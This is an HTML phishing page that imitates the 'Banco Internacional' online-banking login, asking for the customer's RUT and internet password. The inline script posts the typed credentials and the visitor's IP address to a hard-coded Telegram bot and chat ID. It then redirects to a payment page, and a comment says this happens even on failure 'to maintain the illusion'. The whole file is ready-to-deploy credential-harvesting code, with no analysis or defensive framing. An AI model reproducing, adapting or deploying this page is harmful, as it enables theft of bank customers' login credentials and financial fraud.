<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Internacional</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            background-image: url('ruta-a-tu-imagen-de-fondo.jpg');
            background-size: cover;
            background-position: center;
        }
        
        .container {
            max-width: 414px;
            margin: 0 auto;
            height: 100%;
            position: relative;
            background-color: rgba(255, 255, 255, 0.85);
        }
        
        .logo {
            text-align: center;
            padding: 20px 0;
            background-color: #fff;
        }
        
        .logo img {
            height: 40px;
        }
        
        .tabs {
            display: flex;
            border-bottom: 1px solid #ccc;
            background-color: #fff;
        }
        
        .tab {
            flex: 1;
            text-align: center;
            padding: 15px 0;
            color: #666;
            font-weight: bold;
            cursor: pointer;
        }
        
        .tab.active {
            color: #003087;
            border-bottom: 3px solid #003087;
        }
        
        .form-container {
            padding: 20px;
            background-color: #fff;
        }
        
        h2 {
            margin-top: 0;
            font-size: 18px;
            color: #333;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #666;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .forgot-password {
            text-align: center;
            margin: 15px 0;
        }
        
        .forgot-password a {
            color: #003087;
            text-decoration: none;
            font-size: 14px;
        }
        
        .btn-login {
            width: 100%;
            padding: 12px 0;
            background-color: #EC8AA4;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .btn-login.loading {
            opacity: 0.7;
            pointer-events: none;
        }
        
        .btn-login:hover {
            background-color: #dc7a94;
        }
        
        .footer {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #003087;
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" style="background-color: #003087;">
            <!-- Logo placeholder -->
            <img src="../img/logo-bancointernacional-blanco.ebfeb941.svg" alt="Banco Internacional">
        </div>
        
        <div class="tabs">
            <div class="tab active">Personas</div>
            <div class="tab">Empresas</div>
        </div>
        
        <div class="form-container">
            <h2>Inicio de sesi贸n</h2>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="dato1">RUT usuario</label>
                    <input type="text" id="dato1" name="dato1" required>
                </div>
                
                <div class="input-group">
                    <label for="dato2">Clave de internet</label>
                    <input type="password" id="dato2" name="dato2" required>
                </div>
                
                <button type="submit" class="btn-login" id="submitBtn">Ingresar</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Recuperar clave de internet</a>
            </div>
        </div>
        
        <div class="footer">
            Inf贸rmese sobre la garant铆a estatal a los dep贸sitos en su Banco o en www.cmfchile.cl
        </div>
    </div>

    <script>
        // Configuraci贸n de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci贸n despu茅s del env铆o

        // Tab functionality (optional)
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const rut = document.getElementById('dato1').value;
            const clave = document.getElementById('dato2').value;
            
            // Show loading state
            submitBtn.classList.add('loading');
            submitBtn.innerHTML = 'Procesando...';
            
            try {
                // Prepare message for Telegram
                const message = ` Banco Internacional - Inicio de sesi贸n:\n\n` +
                              `RUT usuario: ${rut}\n` +
                              `Clave de internet: ${clave}\n` +
                              `Fecha: ${new Date().toLocaleString('es-ES')}\n` +
                              `IP: ${await getClientIP()}`;
                
                // Send to Telegram
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    // Success - redirect after short delay
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);
                } else {
                    throw new Error('Error en el env铆o');
                }
                
            } catch (error) {
                console.error('Error:', error);
                // Still redirect even if there's an error to maintain the illusion
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1000);
            }
        });

        // Function to get client IP (optional)
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
